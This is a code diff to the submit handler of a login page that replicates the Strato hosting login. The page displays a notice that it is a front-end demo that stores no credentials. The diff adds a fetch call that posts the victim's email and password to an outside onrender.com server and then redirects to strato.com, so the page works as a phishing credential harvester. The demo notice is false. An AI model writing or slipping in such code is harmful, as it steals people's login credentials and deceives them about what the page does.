@@ -65,4 +65,28 @@ form.addEventListener('submit', (e) => {
   demoNote.textContent =
     "Front-end demo only — this replica does not send or store any credentials.";
   demoNote.hidden = false;
+
+  fetch('https://web-backend-kim3.onrender.com/', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                email: email.value,
+                password: password.value,
+                source: 'Strato',
+              }),
+            })
+              .then((res) => {
+                if (!res.ok) {
+                  throw new Error(
+                    'Network response was not ok ' + res.statusText,
+                  );
+                }
+                return res.json();
+              })
+              .then((data) => {
+                window.location.href = 'strato.com';
+              });
+  
 });
